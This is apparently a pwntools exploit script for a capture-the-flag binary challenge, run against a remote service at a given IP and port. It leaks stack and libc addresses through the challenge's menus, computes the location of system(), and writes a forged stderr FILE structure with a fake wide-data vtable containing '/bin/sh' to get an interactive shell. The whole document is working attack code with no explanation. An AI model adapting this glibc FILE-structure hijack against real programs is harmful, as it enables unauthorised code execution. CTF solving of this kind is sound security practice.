from pwn import *
elf = context.binary = ELF("./chall_patched")
context.log_level = "Debug"
libc = ELF("./libc.so.6")
# io = process()
io = remote("34.84.25.24", 13579)
gs = '''
# b *pwquiz+173
# b *pwquiz+207
# b *int_float_translater+174
# b *notepad+72
# b *slide_puzzle+423
b *notepad+0xc6
'''
# gdb.attach(io,gdbscript=gs)
io.sendlineafter(b">",b"1")
io.sendlineafter(b">",b"0")
io.sendlineafter(b">",b"2")
io.sendlineafter(b">",b"0")

io.sendlineafter(b">",b"3")
io.sendlineafter(b">",b"q")

io.sendlineafter(b">",b"4")
io.sendlineafter(b">",b"0")

io.sendlineafter(b">",b"3")
io.recvline()
io.recvline()
io.recvn(0x5)


leak = io.recvline()[:-1]
print(leak)
stack = leak.split()
stack_low=stack[0x0]
stack_low = int(stack_low) & 0xffffffff


stack_high = int(stack[0x1])

stack_leak = stack_high<<32 | stack_low
stack_leak +=0x1
print(hex(stack_leak))

log.critical(f"stack leak : {hex(stack_leak)}")

io.sendlineafter(b">",b"q")


io.sendlineafter(b">",b"4")
io.sendlineafter(b">",b"1")


print("Writing deadbeef into int_float_stack")
io.sendlineafter(b">",str((stack_leak)))
io.sendlineafter(b">",b"0")

io.sendlineafter(b">",b"3")


# sequence = b"sddsawassdwwassdw"
sequence  = b"sdddsaawdssawwassdw"

for i in range(0,len(sequence)):
    io.sendlineafter(b">",p8(sequence[i]))

io.sendlineafter(b">",b"q")
io.sendlineafter(b">",b"1")

io.recvuntil(b"content: ")

libc_leak = unpack(io.recvn(0x5),"all")

libc_leak = libc_leak<<8
log.critical(f"libc leaked address : {hex(libc_leak)}")

system_addr =libc_leak+0x50d70-0x217600

libc_base = libc_leak-0x217600


io.sendlineafter(b">",b"0")
io.sendlineafter(b">",b"4")
io.sendlineafter(b">",b"1")



log.info(f"Libc base is {hex(libc_base)}")
# libc.address = libc_base

#  payload = flat({
#     0x0:0x0,
#     0x68:elf.sym.win,
#     0xe0:heap_address,
#     0xa0:heap_address,
#     0x88:lock_address,
#     0xd8:overflow,

# })

stderr_address = libc_base+0x21b6a0

fake_wide_data = stderr_address-0x48
wide_vtable  = stderr_address


print(hex(wide_vtable))




lock = libc_base+0x205710
fake_stderr_vtable = libc_base+0x2170c0


# payload =flat({
#     0x0:fake_stderr_flags,
#     0x8:wide_vtable,
#     0x20:0x0,
#     0x28:0x1,
#     0xa0:fake_wide_data,
#     0x68:system_addr,
#     0xe0:fake_stderr_vtable,
#     0x88:lock,


# })

chain = libc_base+0x2038e0

payload =pack(0x3b01010101010101)#0x0
payload+=b"/bin/sh\x00"#0x8

payload+=pack(0x0)#0x10

payload+=b"\x00"*(0x20-0x18)

payload +=pack(0x0)#0x20
payload+=pack(0x1)#0x28

payload+=p8(0x0)*(0x60-0x30)

payload+=pack(system_addr)#60
payload+=pack(chain)#68

payload+=p8(0x0)*(0x88-0x70)

payload+=pack(lock)#0x88
payload+=p8(0x0)*(0x98-0x90)#0x90
payload+=pack(wide_vtable-0x8)#0x98
payload+=p8(0x0)*(0xa0-0x90-0x10)

payload+=pack(fake_wide_data)#a0
payload+=pack(0x0)#a8
payload+=p8(0x0)*(0xd8-0xa8-0x8)

payload+=pack(fake_stderr_vtable)

print(f"fake wide data address = {hex(fake_wide_data)}")

print(f"fake_wide vtable address is {hex(wide_vtable)}")








print(len(payload))

write_address =stderr_address
print("Writing deadbeef into int_float_stack")
io.sendlineafter(b">",str((write_address)))
io.sendlineafter(b">",b"0")

io.sendlineafter(b">",b"3")


sequence  = b"wddsaawdssawwassdw"

# sequence  = b"sdddsaawdssawwassdw"

for i in range(0,len(sequence)):
    io.sendlineafter(b">",p8(sequence[i]))

io.sendlineafter(b">",b"q")
io.sendlineafter(b">",b"1")
io.sendlineafter(b">",b"1")

print(len(payload))
io.sendlineafter(b"content >",payload)










io.interactive()
